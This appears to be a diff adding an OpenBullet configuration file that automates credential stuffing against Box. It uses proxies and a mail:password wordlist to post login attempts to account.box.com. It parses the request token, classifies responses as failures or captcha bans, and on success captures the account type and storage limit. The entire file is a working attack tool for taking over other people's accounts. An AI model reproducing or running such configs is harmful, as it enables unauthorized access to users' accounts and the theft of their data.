@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Box",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-16T06:15:19.7684485+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Login REQUEST GET "https://account.box.com/login" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Token PARSE "<SOURCE>" LR "name=\"request_token\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Login REQUEST POST "https://account.box.com/login/credentials?redirect_url=%2F" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>&_pw_sql=&request_token=<TOKEN>&redirect_url=%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Login Credentials" 
+  KEYCHAIN Ban OR 
+    KEY "Invalid captcha response" 
+#Get_Capture REQUEST GET "https://app.box.com/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Success KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "isEnterpriseAccount\":" 
+#Account_Type PARSE "<SOURCE>" LR "accountType\":\"" "\"" Recursive=FALSE -> CAP "Type" "" "" 
+#Space PARSE "<SOURCE>" LR "spaceLimit\":\"" "\"" Recursive=FALSE -> CAP "Space" "" "" 
